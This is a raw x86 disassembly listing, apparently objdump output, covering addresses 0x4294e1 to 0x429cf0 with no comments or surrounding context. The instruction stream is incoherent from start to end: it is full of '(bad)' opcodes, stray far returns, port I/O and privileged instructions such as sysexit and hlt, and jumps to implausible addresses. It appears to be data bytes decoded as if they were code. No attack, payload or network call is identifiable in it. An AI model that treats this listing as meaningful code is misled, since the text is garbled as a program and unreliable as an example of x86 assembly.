  4294e1:	test   DWORD PTR [ebp+0x75],eax
  4294e4:	call   0xc83f7574
  4294e9:	jge    0x42947f
  4294eb:	mov    ebp,ebx
  4294ed:	fcom   st(7)
  4294ef:	add    bh,al
  4294f1:	mov    ebx,DWORD PTR [eax-0x7a6f8304]
  4294f7:	add    edi,edi
  4294f9:	add    bh,bh
  4294fb:	add    ah,cl
  4294fd:	add    ah,dl
  4294ff:	push   eax
  429500:	inc    ebp
  429501:	push   esi
  429502:	fisttp WORD PTR [ebx+0x4dc7f43f]
  429508:	test   BYTE PTR [ebx],dh
  42950a:	aam    0x5
  42950c:	retf   0x4572
  42950f:	add    bl,ah
  429511:	rcl    ebx,0x84
  429514:	mov    DWORD PTR [ecx],0x46d1008c
  42951a:	jl     0x42951c
  42951c:	test   edi,eax
  42951e:	jmp    esp
  429520:	inc    DWORD PTR [eax]
  429522:	loope  0x429524
  429524:	aam    0x75
  429526:	test   DWORD PTR [ebx+0x45fffcff],ecx
  42952c:	out    dx,al
  42952d:	mov    ebp,eax
  42952f:	mov    ah,0x85
  429531:	add    bh,bh
  429533:	call   0x116be37
  429538:	retf   0x858b
  42953b:	cld    
  42953c:	inc    DWORD PTR [eax+0xeb01ff]
  429542:	out    dx,al
  429543:	xor    BYTE PTR [ebp-0xff0085],al
  429549:	mov    edx,ecx
  42954b:	cld    
  42954c:	jl     0x4294d7
  42954e:	push   ebx
  42954f:	add    DWORD PTR [eax],eax
  429551:	add    BYTE PTR [eax+0x1],dl
  429554:	inc    ebp
  429555:	inc    ebp
  429556:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  42955c:	dec    DWORD PTR [ebx-0x3fd90318]
  429562:	add    BYTE PTR [ebp-0xbf0040],dl
  429568:	inc    ebp
  429569:	retf   0x8b
  42956c:	cld    
  42956d:	push   eax
  42956e:	mov    al,0x45
  429570:	add    DWORD PTR [ebx+0x459c00],ecx
  429576:	mov    edi,edi
  429578:	mov    eax,0xe80800ff
  42957d:	inc    ebp
  42957e:	sub    DWORD PTR [ebx-0x47000400],ecx
  429584:	add    al,0x1
  429586:	rol    BYTE PTR [eax],0x1e
  429589:	jne    0x4295d0
  42958b:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  429591:	inc    DWORD PTR [ecx]
  429593:	call   0x87bd98
  429598:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  42959e:	call   0x42bea4
  4295a3:	xor    bh,bh
  4295a5:	push   edi
  4295a6:	adc    BYTE PTR [ebx-0x747423bb],al
  4295ac:	loopne 0x42958a
  4295ae:	ret    
  4295af:	loopne 0x42954f
  4295b1:	xor    DWORD PTR [edx],0x31
  4295b4:	cmp    edi,edi
  4295b6:	bswap  esp
  4295b8:	rol    BYTE PTR gs:[eax],0x5
  4295bc:	jmp    0x12d9706
  4295c1:	mov    eax,DWORD PTR [ebp-0x4]
  4295c4:	add    BYTE PTR [eax+0xff0100],bh
  4295ca:	cld    
  4295cb:	jne    0x42964a
  4295cd:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  4295d3:	pusha  
  4295d4:	add    DWORD PTR [eax],eax
  4295d6:	add    BYTE PTR [eax-0x37],dl
  4295d9:	inc    ebp
  4295da:	add    BYTE PTR [ebx+0x459850],cl
  4295e0:	mov    edi,edi
  4295e2:	test   al,0xff
  4295e4:	add    BYTE PTR [eax],cl
  4295e6:	inc    DWORD PTR [ebp-0x18]
  4295e9:	jmp    DWORD PTR ds:0x4d7d00dc
  4295ef:	adc    BYTE PTR [ebx+0x459cb9],cl
  4295f5:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  4295fb:	sahf   
  4295fc:	mov    eax,0x30132
  429601:	lea    esi,[ebp+0x2c]
  429604:	xor    edi,edi
  429606:	(bad)  
  429607:	call   0x141be74
  42960c:	call   0x136be9c
  429611:	jne    0x42959e
  429613:	xor    edi,esp
  429615:	add    eax,DWORD PTR [eax+0xc018d]
  42961b:	push   DWORD PTR [eax]
  42961d:	call   0xcbbe79
  429622:	int3   
  429623:	inc    DWORD PTR [ebp-0x14]
  429626:	mov    ecx,DWORD PTR [ebp-0x28]
  429629:	xor    eax,DWORD PTR [eax]
  42962b:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  429631:	(bad)  
  429632:	xchg   ebp,eax
  429633:	in     al,0xff
  429635:	add    bh,bh
  429637:	add    BYTE PTR [edi+0x508b0045],bl
  42963d:	or     BYTE PTR [ebp-0x3d],al
  429640:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff62]
  429647:	mov    edi,edi
  429649:	or     BYTE PTR [eax],cl
  42964b:	inc    ebp
  42964c:	test   DWORD PTR gs:[eax],eax
  42964f:	je     0x429696
  429651:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  429657:	xor    edx,DWORD PTR [eax-0x73]
  42965a:	push   ebp
  42965b:	or     BYTE PTR [ebp+0x21007572],al
  429661:	inc    ebp
  429662:	in     al,dx
  429663:	mov    ebp,DWORD PTR [eax]
  429665:	mov    esp,0x628bc345
  42966a:	fmul   st,st(5)
  42966c:	add    BYTE PTR [ebx],ch
  42966e:	mov    eax,DWORD PTR [ebx]
  429670:	cld    
  429671:	loopne 0x429633
  429673:	inc    ebp
  429674:	push   ebp
  429675:	cmp    ebp,eax
  429677:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  42967e:	cld    
  42967f:	fadd   DWORD PTR [eax+0x3b014d]
  429685:	jne    0x4296b7
  429687:	push   0xf8898557
  42968c:	in     al,dx
  42968d:	jne    0x4296d4
  42968f:	lea    eax,[ebx+0x72e8dcc8]
  429695:	xor    BYTE PTR [ebx+0x7545bc00],cl
  42969b:	jmp    0x4296d0
  42969d:	mov    edi,DWORD PTR [edi+0x4572bc]
  4296a3:	xor    eax,edi
  4296a5:	adc    DWORD PTR [ebp-0xcd0062],0x8b2b31
  4296af:	rcl    BYTE PTR [eax-0x40],1
  4296b2:	inc    ebp
  4296b3:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  4296bb:	inc    ebp
  4296bc:	xchg   ebp,eax
  4296bd:	ud0    ebp,DWORD PTR [ebx]
  4296c0:	inc    DWORD PTR [eax]
  4296c2:	adc    eax,0x508a0076
  4296c7:	adc    BYTE PTR [ebp+0x1f],0x8b
  4296cb:	or     al,0xf4
  4296cd:	inc    eax
  4296ce:	retf   
  4296cf:	inc    ebp
  4296d0:	iret   
  4296d1:	jb     0x42969b
  4296d3:	mov    eax,DWORD PTR [edi]
  4296d5:	enter  0x4545,0x1
  4296d9:	xor    eax,0x898b9c00
  4296de:	mov    esp,0x33344df0
  4296e3:	pushf  
  4296e4:	lea    ecx,[ecx+0x4d72e008]
  4296ea:	add    BYTE PTR [ebx],dh
  4296ec:	inc    ebp
  4296ed:	mov    DWORD PTR [ebx-0x3f611b4c],ecx
  4296f3:	xor    dl,BYTE PTR [edx]
  4296f5:	add    eax,DWORD PTR [ebp-0x77]
  4296f8:	mov    eax,esp
  4296fa:	fmul   DWORD PTR [ebp-0x3d]
  4296fd:	xor    eax,DWORD PTR [ebx+eax*1+0x832899e]
  429704:	mov    DWORD PTR [ebp-0x28],eax
  429707:	aad    0x45
  429709:	pushf  
  42970a:	xor    eax,edi
  42970c:	mov    ecx,0xff858db0
  429711:	clc    
  429712:	enter  0x4d45,0x32
  429716:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  42971d:	test   esi,edi
  42971f:	clc    
  429720:	inc    DWORD PTR [ebp+0x45]
  429723:	xor    BYTE PTR [ebx-0x3738f764],cl
  429729:	test   al,0x16
  42972b:	test   DWORD PTR ds:0xff459cf8,esi
  429731:	ds cld 
  429733:	pushf  
  429734:	inc    ebp
  429735:	mov    edx,DWORD PTR [eax-0x28]
  429738:	popf   
  429739:	push   ebp
  42973a:	add    BYTE PTR [ebx],dh
  42973c:	mov    DWORD PTR [ebx],eax
  42973e:	sar    BYTE PTR [ebx],1
  429740:	adc    BYTE PTR [edi],cl
  429742:	dec    ebp
  429743:	adc    al,0x8b
  429745:	add    al,dl
  429747:	jmp    0x1039917
  42974c:	jb     0x42979b
  42974e:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  429754:	xor    ecx,DWORD PTR [ebp+0x3b]
  429757:	xor    ecx,DWORD PTR [edi]
  429759:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  42975d:	(bad)  
  42975f:	clc    
  429760:	enter  0x8400,0x8b
  429764:	pop    es
  429765:	mov    al,0x0
  429767:	push   ebp
  429768:	push   cs
  429769:	xor    ecx,eax
  42976b:	xor    esp,ecx
  42976d:	add    ebp,DWORD PTR [eax]
  42976f:	add    esi,DWORD PTR [eax]
  429771:	(bad)  
  429773:	retf   0x55c8
  429776:	repnz mov eax,DWORD PTR [ebp-0x10]
  42977a:	(bad)  
  42977b:	cli    
  42977c:	fdivr  st,st(1)
  42977e:	test   DWORD PTR [eax+edi*8],ecx
  429781:	dec    ebp
  429782:	inc    ebp
  429783:	xor    edi,DWORD PTR [eax-0x7167afd]
  429789:	add    BYTE PTR [ebp+0x0],al
  42978c:	mov    ecx,DWORD PTR [ebp-0x28]
  42978f:	mov    ecx,ebx
  429791:	clc    
  429792:	jne    0x42975f
  429794:	mov    esi,0xd672d3
  429799:	into   
  42979a:	into   
  42979b:	scas   eax,DWORD PTR es:[edi]
  42979c:	dec    ebp
  42979d:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  4297a3:	sub    ecx,esi
  4297a5:	cmp    ecx,DWORD PTR [ebp+0x77]
  4297a8:	(bad)  
  4297a9:	mov    edi,eax
  4297ab:	mov    al,0x85
  4297ad:	mov    eax,edi
  4297af:	add    BYTE PTR [ebp-0x75],al
  4297b2:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  4297b9:	xor    eax,DWORD PTR [ebp+0x4503f803]
  4297bf:	rdtsc  
  4297c1:	retf   0x559c
  4297c4:	(bad)  
  4297c5:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  4297cc:	inc    ebp
  4297cd:	add    eax,0xeb9c4d3f
  4297d2:	(bad)  
  4297d3:	mov    ecx,esp
  4297d5:	lods   al,BYTE PTR ds:[esi]
  4297d6:	test   DWORD PTR [ebp-0x8],edx
  4297d9:	xor    ecx,DWORD PTR [ebp+0x33]
  4297dc:	mov    eax,DWORD PTR [ebx]
  4297de:	lock add ecx,ebx
  4297e1:	bswap  esi
  4297e3:	retf   0x55d1
  4297e6:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  4297ec:	jmp    0x4297e7
  4297ee:	add    BYTE PTR ds:0xebc44d8b,al
  4297f4:	push   ebp
  4297f5:	mov    ebp,DWORD PTR [ebx]
  4297f7:	test   al,0x8b
  4297f9:	push   ebp
  4297fa:	clc    
  4297fb:	xor    ecx,ebx
  4297fd:	xor    ecx,esi
  4297ff:	add    edx,ecx
  429801:	add    eax,DWORD PTR [edx+0xca010f]
  429807:	push   ebp
  429808:	dec    ebp
  429809:	mov    ecx,DWORD PTR [ebx-0x34050710]
  42980f:	stc    
  429810:	rol    DWORD PTR ds:0xebce4dd6,cl
  429816:	scas   eax,DWORD PTR es:[edi]
  429817:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  42981d:	xor    ebp,DWORD PTR [ebx]
  42981f:	xor    edi,DWORD PTR [ebx]
  429821:	add    esi,DWORD PTR [edi+0x3]
  429824:	mov    ecx,DWORD PTR [edi]
  429826:	clc    
  429827:	retf   0x55cb
  42982a:	into   
  42982b:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  429832:	mov    eax,0x3376554d
  429837:	mov    esi,DWORD PTR [ebx]
  429839:	int3   
  42983a:	add    edx,DWORD PTR [ebp+0x3]
  42983d:	xor    ecx,DWORD PTR [edi]
  42983f:	xor    ecx,edx
  429841:	add    edx,DWORD PTR [ebp+0x3]
  429844:	mov    ecx,DWORD PTR [edi]
  429846:	lock retf 0x4dfa
  42984a:	stc    
  42984b:	mov    ecx,DWORD PTR [eax]
  42984d:	or     BYTE PTR [ebp+0x4d],cl
  429850:	jmp    0x10698e0
  429855:	dec    ebp
  429856:	dec    ebp
  429857:	(bad)  
  429858:	mov    ebx,esp
  42985a:	clc    
  42985b:	test   ebx,ecx
  42985d:	clc    
  42985e:	ror    DWORD PTR [ebp-0x2a],cl
  429861:	mov    esi,ecx
  429863:	call   0x33cdde17
  429868:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  42986f:	retf   
  429870:	ja     0x429840
  429872:	mov    ebp,DWORD PTR [eax-0x48]
  429875:	dec    ebp
  429876:	xor    ecx,DWORD PTR [di+0x3]
  42987a:	mov    esp,esp
  42987c:	clc    
  42987d:	push   ebp
  42987e:	retf   
  42987f:	mov    dl,bl
  429881:	adc    esi,edx
  429883:	jb     0x429853
  429885:	add    BYTE PTR [edi-0x3b7474b3],ch
  42988b:	call   0x4d6e640d
  429890:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  429896:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429897:	sahf   
  429898:	inc    ebp
  429899:	xor    cl,BYTE PTR [ebp-0x78]
  42989c:	mov    edx,edi
  42989e:	clc    
  42989f:	dec    ebp
  4298a0:	retf   
  4298a1:	mov    edx,ebx
  4298a3:	call   0x56116c7e
  4298a8:	scas   eax,DWORD PTR es:[edi]
  4298a9:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  4298af:	sahf   
  4298b0:	sub    esi,DWORD PTR [edx]
  4298b2:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  4298b8:	lods   al,BYTE PTR ds:[esi]
  4298b9:	xor    esp,DWORD PTR [ebx]
  4298bb:	add    ecx,DWORD PTR [ebp-0x1c]
  4298be:	mov    edi,DWORD PTR [ebp-0x8]
  4298c1:	mov    bl,cl
  4298c3:	cmp    dl,bl
  4298c5:	jb     0x429895
  4298c7:	add    dh,dl
  4298c9:	dec    ebp
  4298ca:	scas   eax,DWORD PTR es:[edi]
  4298cb:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  4298d1:	shr    DWORD PTR [ebx],cl
  4298d3:	into   
  4298d4:	cmp    edx,esi
  4298d6:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  4298dc:	dec    ebp
  4298dd:	dec    ebp
  4298de:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  4298e4:	retf   
  4298e5:	xor    edx,esi
  4298e7:	add    ecx,esi
  4298e9:	imul   ecx,edx
  4298ec:	mov    DWORD PTR [ebp+0x8],edx
  4298ef:	xor    ecx,DWORD PTR [ebp+0x2b]
  4298f2:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  4298f8:	add    esi,DWORD PTR [ebx]
  4298fa:	mov    ah,0x3
  4298fc:	inc    ebp
  4298fd:	sysexit 
  4298ff:	xlat   BYTE PTR ds:[ebx]
  429900:	pushf  
  429901:	jge    0x42988c
  429903:	xor    ebx,eax
  429905:	sub    eax,DWORD PTR [ebp-0x73]
  429908:	(bad)  
  429909:	cmp    al,al
  42990b:	jb     0x429892
  42990d:	add    al,bh
  42990f:	ror    DWORD PTR [ebp-0x7a],1
  429912:	xor    edi,edi
  429914:	add    edi,edi
  429916:	jmp    0x429965
  429918:	mov    ecx,DWORD PTR [ebx-0x34341324]
  42991e:	dec    ebp
  42991f:	into   
  429920:	mov    ebp,DWORD PTR [edi-0x23737428]
  429926:	sahf   
  429927:	shl    DWORD PTR [edx],cl
  429929:	retf   0x5588
  42992c:	or     ecx,DWORD PTR [ebp+0x7233114d]
  429932:	add    eax,DWORD PTR [eax]
  429934:	in     al,0x4d
  429936:	push   ebp
  429937:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  42993d:	bound  eax,QWORD PTR [eax]
  42993f:	int    0x4d
  429941:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  429947:	dec    ebp
  429948:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  42994e:	jge    0x42991e
  429950:	mov    BYTE PTR [edi+0xf723b3a],ch
  429956:	add    cl,dh
  429958:	dec    ebp
  429959:	dec    DWORD PTR [ebx-0x2c032375]
  42995f:	adc    BYTE PTR [ebp+0x1],0x8b
  429963:	add    al,bl
  429965:	jge    0x4298f3
  429967:	push   0xffffff9e
  429969:	push   0x8b3032
  42996e:	shl    BYTE PTR [ebp+0x55],0x6a
  429972:	xor    edi,edi
  429974:	xor    edx,DWORD PTR [ebx+eax*1]
  429977:	inc    ebp
  429978:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  42997e:	dec    ebp
  42997f:	or     BYTE PTR [ecx+0x4dc8e483],cl
  429985:	jbe    0x429912
  429987:	mov    ebp,esp
  429989:	ror    bl,1
  42998b:	enter  0x14ce,0xaf
  42998f:	dec    DWORD PTR [ebx-0x2cef17f8]
  429995:	push   ebp
  429996:	retf   0x5540
  429999:	push   ebp
  42999a:	mov    esi,DWORD PTR [edx-0x1c]
  42999d:	mov    edx,ebx
  42999f:	cld    
  4299a0:	(bad)  
  4299a1:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  4299a8:	sti    
  4299a9:	add    dh,cl
  4299ab:	push   0xffffff94
  4299ad:	call   FWORD PTR [esi+0x3b5032d0]
  4299b3:	mov    ecx,DWORD PTR [edi]
  4299b5:	int3   
  4299b6:	pop    esi
  4299b7:	inc    ebp
  4299b8:	dec    DWORD PTR [ecx+0x45e8c88b]
  4299be:	push   ebp
  4299bf:	xor    esi,DWORD PTR [ebx]
  4299c1:	mov    DWORD PTR [ebx],0xcacc0f9c
  4299c7:	aas    
  4299c8:	push   ebp
  4299c9:	inc    ebp
  4299ca:	xor    eax,esp
  4299cc:	add    eax,esp
  4299ce:	mov    eax,DWORD PTR [ebx]
  4299d0:	(bad)  
  4299d1:	jmp    0x42995f
  4299d3:	mov    bl,BYTE PTR [esi-0x7674cdfb]
  4299d9:	rol    ah,1
  4299db:	mov    esi,0xf133104d
  4299e0:	mov    edx,0xff358d80
  4299e5:	mov    dh,0xd1
  4299e7:	cmp    edx,DWORD PTR [ebp+0xf]
  4299ea:	mov    eax,DWORD PTR [edx-0x20]
  4299ed:	add    BYTE PTR [ebp-0x75],bh
  4299f0:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  4299f7:	sahf   
  4299f8:	retf   0x8632
  4299fb:	cmp    ebp,0x8
  4299fe:	call   ebx
  429a00:	inc    ebp
  429a01:	inc    ebp
  429a02:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  429a08:	mov    esi,DWORD PTR ds:0xc7049cc8
  429a0e:	add    al,al
  429a10:	add    bl,al
  429a12:	(bad)  
  429a13:	clc    
  429a14:	enter  0x45,0x35
  429a18:	push   eax
  429a19:	pushf  
  429a1a:	mov    edi,eax
  429a1c:	int3   
  429a1d:	or     al,al
  429a1f:	test   DWORD PTR [edi],edi
  429a21:	clc    
  429a22:	gs inc ebp
  429a24:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  429a2a:	push   ss
  429a2b:	xor    ecx,DWORD PTR [ebp+0x3]
  429a2e:	sub    edx,DWORD PTR [ecx-0x76]
  429a31:	dec    ebp
  429a32:	add    DWORD PTR [ebx+0x88d845],ecx
  429a38:	mov    esi,DWORD PTR [ebx]
  429a3a:	or     BYTE PTR [ebx],al
  429a3c:	cmp    edx,DWORD PTR [ecx-0x38]
  429a3f:	dec    ebp
  429a40:	out    dx,eax
  429a41:	xor    eax,DWORD PTR [ebp+0x3]
  429a44:	mov    edx,DWORD PTR [ecx-0x28]
  429a47:	dec    ebp
  429a48:	add    BYTE PTR [ebx],dh
  429a4a:	push   0x518003
  429a4f:	push   eax
  429a50:	add    BYTE PTR [ebx-0x300748b],cl
  429a56:	sbb    BYTE PTR [ebp+0x45],cl
  429a59:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  429a5f:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  429a65:	dec    ebp
  429a66:	inc    ebp
  429a67:	xor    eax,esp
  429a69:	add    eax,esp
  429a6b:	push   ecx
  429a6c:	(bad)  
  429a6d:	dec    ebp
  429a6e:	mov    al,ds:0xc9e031ff
  429a73:	retf   
  429a74:	(bad)  
  429a75:	into   
  429a76:	sub    bh,bh
  429a78:	dec    esp
  429a79:	adc    al,0x9c
  429a7b:	inc    ebp
  429a7c:	push   ebp
  429a7d:	test   DWORD PTR [edi],ecx
  429a7f:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab6ff80]
  429a86:	jmp    0xc9bba99a
  429a8b:	add    cl,dl
  429a8d:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  429a97:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  429a9d:	rol    BYTE PTR [eax],0x57
  429aa0:	clc    
  429aa1:	bound  esi,QWORD PTR [edx+0x7]
  429aa4:	mov    eax,DWORD PTR [ebp-0x30]
  429aa7:	xor    al,0x40
  429aa9:	sub    al,0xc7
  429aab:	mov    ah,ch
  429aad:	add    DWORD PTR [ebp+0x4534f845],eax
  429ab3:	sub    al,0x86
  429ab5:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  429abc:	mov    ch,0xff
  429abe:	clc    
  429abf:	add    DWORD PTR [ebp+0x60],0x31
  429ac3:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  429aca:	inc    ebp
  429acb:	dec    DWORD PTR [ebx-0x341ff701]
  429ad1:	test   esi,ecx
  429ad3:	dec    DWORD PTR [ebx-0x7f8a3301]
  429ad9:	push   eax
  429ada:	add    DWORD PTR [ebp+0x0],eax
  429add:	dec    ebx
  429adf:	or     al,0xce
  429ae1:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  429ae8:	into   
  429ae9:	add    BYTE PTR [ebx-0x34ff1400],cl
  429aef:	mov    esi,ecx
  429af1:	sar    bh,0x45
  429af4:	adc    al,0x8b
  429af6:	clc    
  429af7:	fadd   DWORD PTR [ebp+0x0]
  429afa:	mov    ebp,DWORD PTR [edx+0x8]
  429afd:	push   edi
  429afe:	adc    BYTE PTR [eax+0x1],0x83
  429b02:	add    al,al
  429b04:	retf   
  429b05:	mov    ecx,esi
  429b07:	cld    
  429b08:	mov    eax,DWORD PTR [eax+0xcb01cc]
  429b0e:	into   
  429b0f:	add    BYTE PTR [ebx+0x756aec00],cl
  429b15:	jne    0x429b4a
  429b17:	inc    DWORD PTR [ebx]
  429b19:	rcl    BYTE PTR [ecx+0x50],1
  429b1c:	push   eax
  429b1d:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  429b23:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  429b2a:	sar    bh,0x84
  429b2d:	or     BYTE PTR [ebx],al
  429b2f:	push   eax
  429b30:	add    BYTE PTR [ebx+0x4532c845],cl
  429b36:	pushf  
  429b37:	xor    eax,0x89b49cc7
  429b3c:	test   eax,ebp
  429b3e:	clc    
  429b3f:	inc    ebp
  429b40:	inc    ebp
  429b41:	mov    DWORD PTR [eax+eax*8],esi
  429b44:	sub    al,0x34
  429b46:	mov    BYTE PTR [ebx+ecx*4+0x57d8ec89],bl
  429b4d:	dec    ebp
  429b4e:	bound  esi,QWORD PTR [ebx]
  429b50:	inc    edi
  429b51:	add    ecx,DWORD PTR [ebx+0x57f4b489]
  429b57:	dec    ebp
  429b58:	bound  esi,QWORD PTR [ebx]
  429b5a:	inc    edi
  429b5b:	add    eax,DWORD PTR [ebx-0xf7a377]
  429b61:	inc    ebp
  429b62:	add    ch,dl
  429b64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429b65:	pushf  
  429b66:	inc    edi
  429b68:	dec    esp
  429b6a:	lea    eax,[ebp+0x45fff860]
  429b70:	push   eax
  429b71:	xor    dh,BYTE PTR [ebp-0x64]
  429b74:	(bad)  
  429b75:	(bad)  
  429b76:	pop    esp
  429b77:	lods   al,BYTE PTR ds:[esi]
  429b78:	inc    DWORD PTR [ebp+0x4508f8ff]
  429b7e:	mov    esi,DWORD PTR [eax]
  429b80:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  429b87:	test   DWORD PTR [edi-0x8],edx
  429b8a:	inc    esi
  429b8b:	inc    ebp
  429b8c:	add    BYTE PTR [esi],bh
  429b8e:	push   0x8b809c
  429b93:	in     al,dx
  429b94:	inc    ebp
  429b95:	push   ebp
  429b96:	mov    esi,DWORD PTR [ebx]
  429b98:	cld    
  429b99:	add    eax,DWORD PTR [eax+0xf013b]
  429b9f:	adc    al,0x0
  429ba1:	add    bh,bh
  429ba3:	jmp    0xbf9cc0
  429ba8:	add    BYTE PTR [ebp+0x45],cl
  429bab:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  429bb1:	dec    ebp
  429bb2:	push   0x38033
  429bb7:	cmp    eax,DWORD PTR [eax]
  429bb9:	unpcklps xmm7,xmm0
  429bbc:	jne    0x429bbe
  429bbe:	dec    DWORD PTR [ebx+0x5545cc18]
  429bc4:	mov    DWORD PTR [ebx],esi
  429bc6:	shl    BYTE PTR [ebx],1
  429bc8:	inc    ebp
  429bc9:	add    ecx,DWORD PTR [ecx+0x60fc803]
  429bcf:	retf   0x5575
  429bd2:	dec    DWORD PTR [ebx-0x5ba17e8]
  429bd8:	(bad)  
  429bd9:	stc    
  429bda:	in     al,dx
  429bdb:	or     al,0x85
  429bdd:	dec    ebp
  429bde:	clc    
  429bdf:	xor    eax,DWORD PTR [ebp+0x3]
  429be2:	mov    ebp,ecx
  429be4:	rol    BYTE PTR [eax],1
  429be6:	inc    ebp
  429be7:	add    BYTE PTR [eax-0x7747ab3],bh
  429bed:	clc    
  429bee:	inc    ebp
  429bef:	retf   
  429bf0:	mov    edx,ebx
  429bf2:	in     al,dx
  429bf3:	(bad)  
  429bf4:	retf   
  429bf5:	into   
  429bf6:	into   
  429bf7:	scas   eax,DWORD PTR es:[edi]
  429bf8:	dec    ebp
  429bf9:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  429bff:	sub    ecx,esi
  429c01:	cmp    ecx,DWORD PTR [ebp+0x77]
  429c04:	(bad)  
  429c05:	mov    edi,eax
  429c07:	int3   
  429c08:	test   DWORD PTR [ecx-0x74baff08],ecx
  429c0e:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  429c15:	xor    eax,DWORD PTR [ebp+0x4503f803]
  429c1b:	rdtsc  
  429c1d:	retf   0x559c
  429c20:	(bad)  
  429c21:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  429c28:	inc    ebp
  429c29:	add    eax,0xeb9c4d3f
  429c2e:	(bad)  
  429c2f:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  429c35:	xor    ecx,DWORD PTR [ebp+0x33]
  429c38:	mov    eax,DWORD PTR [ebx]
  429c3a:	call   0xce526742
  429c3f:	retf   0x55d1
  429c42:	test   BYTE PTR [ebx-0x5ff17fe],cl
  429c48:	jmp    0x429c43
  429c4a:	add    BYTE PTR ds:0xebf44d8b,al
  429c50:	push   ebp
  429c51:	mov    ebp,DWORD PTR [ebx]
  429c53:	mov    eax,0x33f8558b
  429c58:	retf   
  429c59:	xor    ecx,esi
  429c5b:	add    edx,ecx
  429c5d:	add    eax,DWORD PTR [edx+0xca010f]
  429c63:	push   ebp
  429c64:	dec    ebp
  429c65:	mov    ecx,DWORD PTR [ebx-0x34050718]
  429c6b:	stc    
  429c6c:	rol    DWORD PTR ds:0xebce4dd6,cl
  429c72:	scas   eax,DWORD PTR es:[edi]
  429c73:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  429c79:	xor    ebp,DWORD PTR [ebx]
  429c7b:	xor    edi,DWORD PTR [ebx]
  429c7d:	add    esi,DWORD PTR [edi+0x3]
  429c80:	mov    ecx,DWORD PTR [edi]
  429c82:	clc    
  429c83:	retf   0x55cb
  429c86:	into   
  429c87:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  429c8e:	test   al,0x4d
  429c90:	push   ebp
  429c91:	jbe    0x429cc6
  429c93:	mov    esi,DWORD PTR [ebx]
  429c95:	mov    al,0x3
  429c97:	push   ebp
  429c98:	add    esi,DWORD PTR [ebx]
  429c9a:	rdpmc  
  429c9c:	retf   0x5503
  429c9f:	add    ecx,DWORD PTR [ebx-0x53517f1]
  429ca5:	dec    ebp
  429ca6:	stc    
  429ca7:	mov    ecx,DWORD PTR [eax]
  429ca9:	or     BYTE PTR [ebp+0x4d],cl
  429cac:	jmp    0x1369d3c
  429cb1:	dec    ebp
  429cb2:	dec    ebp
  429cb3:	(bad)  
  429cb4:	mov    ebx,esp
  429cb6:	clc    
  429cb7:	test   ebx,ecx
  429cb9:	clc    
  429cba:	ror    DWORD PTR [ebp-0x2a],cl
  429cbd:	mov    esi,ecx
  429cbf:	lock scas eax,DWORD PTR es:[edi]
  429cc1:	inc    ebp
  429cc2:	mov    esi,DWORD PTR [ebx]
  429cc4:	hlt    
  429cc5:	pushf  
  429cc6:	jge    0x429c53
  429cc8:	sub    ebx,esp
  429cca:	cmp    ecx,ebx
  429ccc:	ja     0x429c9c
  429cce:	mov    ebp,DWORD PTR [eax-0x58]
  429cd1:	dec    ebp
  429cd2:	xor    ecx,DWORD PTR [di+0x3]
  429cd6:	mov    esp,esp
  429cd8:	clc    
  429cd9:	push   ebp
  429cda:	retf   
  429cdb:	mov    dl,bl
  429cdd:	adc    esi,edx
  429cdf:	jb     0x429caf
  429ce1:	add    BYTE PTR [edi-0xb7474b3],ch
  429ce7:	lock jge 0x429cb5
  429cea:	sub    ecx,DWORD PTR [ebp+0x3b]
  429ced:	mov    esi,DWORD PTR [edi-0x20]
  429cf0:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459e]
